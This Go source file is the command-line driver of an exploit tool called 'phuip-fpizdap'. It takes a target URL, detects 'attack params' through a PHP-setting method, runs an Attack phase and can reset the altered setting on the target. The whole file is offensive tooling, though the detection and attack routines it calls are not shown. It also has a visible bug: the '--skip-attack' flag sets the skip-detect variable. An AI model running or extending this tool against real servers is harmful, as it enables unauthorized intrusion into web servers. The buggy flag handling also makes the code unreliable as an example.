package main

import (
	"log"

	"github.com/spf13/cobra"
)

func main() {
	var (
		method       string
		cookie       string
		skipDetect   bool
		skipAttack   bool
		resetSetting bool
		params       = &AttackParams{}
	)

	var cmdPrint = &cobra.Command{
		Use:  "phuip-fpizdap [url]",
		Args: cobra.ExactArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			url := args[0]
			m, ok := Methods[method]
			if !ok {
				log.Fatalf("Unknown detection method: %v", method)
			}

			requester, err := NewRequester(url, cookie)
			if err != nil {
				log.Fatalf("Failed to create requester: %v", err)
			}

			if resetSetting {
				if !params.Complete() {
					log.Fatal("--reset-setting requires complete params")
				}
				if err := SetSetting(requester, params, m.PHPOptionDisable); err != nil {
					log.Fatalf("ResetSetting() returned error: %v", err)
				}
				log.Printf("I did my best trying to reset the setting")
				return
			}

			if skipDetect {
				if !params.Complete() {
					log.Fatal("Got --skip-detect and attack params are incomplete, don't know what to do")
				}
				log.Printf("Using attack params %s", params)
			} else {
				var err error
				params, err = Detect(requester, m, params)
				if err != nil {
					log.Fatalf("Detect() returned error: %v", err)
				}

				if !params.Complete() {
					log.Fatal("Detect() returned incomplete attack params, something gone wrong")
				}

				log.Printf("Detect() returned attack params: %s <-- REMEMBER THIS", params)
			}

			if skipAttack {
				log.Print("Attack phase is disabled, so that's it")
				return
			}

			if err := Attack(requester, params); err != nil {
				log.Fatalf("Attack returned error: %v", err)
			}
		},
	}
	cmdPrint.Flags().StringVar(&method, "method", "session.auto_start", "detect method (see detect_methods.go)")
	cmdPrint.Flags().StringVar(&cookie, "cookie", "", "send this cookie")
	cmdPrint.Flags().IntVar(&params.QueryStringLength, "qsl", 0, "qsl hint")
	cmdPrint.Flags().IntVar(&params.PisosLength, "pisos", 0, "pisos hint")
	cmdPrint.Flags().BoolVar(&skipDetect, "skip-detect", false, "skip detection phase")
	cmdPrint.Flags().BoolVar(&skipDetect, "skip-attack", false, "skip attack phase")
	cmdPrint.Flags().BoolVar(&resetSetting, "reset-setting", false, "try to reset setting (requires attack params)")

	if err := cmdPrint.Execute(); err != nil {
		log.Fatal(err)
	}
}
